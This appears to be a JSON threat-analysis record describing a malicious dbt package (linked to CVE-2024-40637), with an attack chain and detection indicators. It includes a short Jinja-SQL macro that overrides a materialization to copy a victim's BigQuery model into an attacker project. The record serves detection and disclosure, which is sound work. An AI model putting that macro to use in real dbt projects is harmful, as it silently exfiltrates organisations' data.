@@ -1,0 +1,79 @@
+{
+  "package_info": {
+    "package_name": "malicious_dbt_package_example",
+    "package_manager": "dbt",
+    "package_versions": "all versions prior to mitigation (see CVE-2024-40637)",
+    "why_malicious": "The package abuses dbt's macro override mechanism to execute arbitrary SQL in the victim's data warehouse, enabling silent data exfiltration or manipulation without user interaction. This violates the trust model of dbt packages and allows attackers to run malicious SQL code during normal dbt operations."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (during dbt run execution)",
+        "file_location": "macros/example.sql",
+        "required_permissions": [
+          "database access (BigQuery)",
+          "network (to GCP)",
+          "filesystem (for dbt logs)"
+        ]
+      },
+      "code_snippet": "{% macro copy_to_attacker_dataset(model) %}\n  create or replace table `myco_example_project.example_dataset.{{ model.name }}` as\n  select * from {{ model }};\n{% endmacro %}",
+      "code_language": "jinja-sql (dbt macro)",
+      "code_behavior": "At runtime, the macro overrides a trusted BigQuery adapter macro, executes a 'CREATE OR REPLACE TABLE' statement that copies the contents of the victim's model into a table in the attacker's Google Cloud project, resulting in silent data exfiltration.",
+      "malice_analysis": {
+        "why_suspicious": "The macro silently copies sensitive data from the victim's database to an external, attacker-controlled dataset without user awareness or consent.",
+        "violated_expectations": "Normal dbt macros should only perform the advertised data transformations within the user's own data warehouse, not exfiltrate data to third-party projects.",
+        "similar_legitimate_use": "Copying data between datasets within the same organization for backup or ETL purposes, but only with explicit user configuration and consent.",
+        "key_indicators": [
+          "Macro creates tables in an external (attacker-controlled) project",
+          "No user interaction required; runs as part of normal dbt run",
+          "Overrides built-in materialization macro",
+          "Uses public Data Editor permissions to facilitate exfiltration"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker publishes a malicious dbt package containing a macro that overrides a built-in materialization.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Victim installs the package and runs dbt as usual."
+    },
+    {
+      "step": 2,
+      "action": "During dbt run, the malicious macro executes, copying data from the victim's models to the attacker's dataset in Google Cloud.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Data is silently exfiltrated to the attacker's infrastructure."
+    },
+    {
+      "step": 3,
+      "action": "Evidence of exfiltration is only present in dbt logs and GCP audit logs, with no proactive alerting.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Attacker gains access to sensitive data; victim is unlikely to notice unless logs are reviewed."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "dbt macro files that override built-in materializations",
+      "macros that reference external (non-org) datasets or projects",
+      "CREATE TABLE or CREATE OR REPLACE TABLE statements targeting external projects",
+      "Unexpected data movement to unfamiliar GCP projects during dbt runs"
+    ],
+    "file_indicators": [
+      "macros/*.sql files containing CREATE TABLE statements with external project IDs",
+      "dbt packages with macros that shadow/override built-in adapter macros"
+    ],
+    "network_indicators": [
+      "BigQuery API calls creating tables in projects not owned by the organization",
+      "Unusual volume of data transfer to external GCP projects during dbt runs"
+    ],
+    "how_to_detect": "Monitor dbt macro files for overrides of built-in materializations, especially those that reference external datasets or projects. Audit dbt run logs and GCP audit logs for CREATE TABLE or data copy operations targeting unfamiliar or attacker-controlled projects. Flag dbt packages that introduce macros with cross-project data movement. Use allow-lists for permitted GCP project IDs in dbt macros and alert on deviations."
+  }
+}
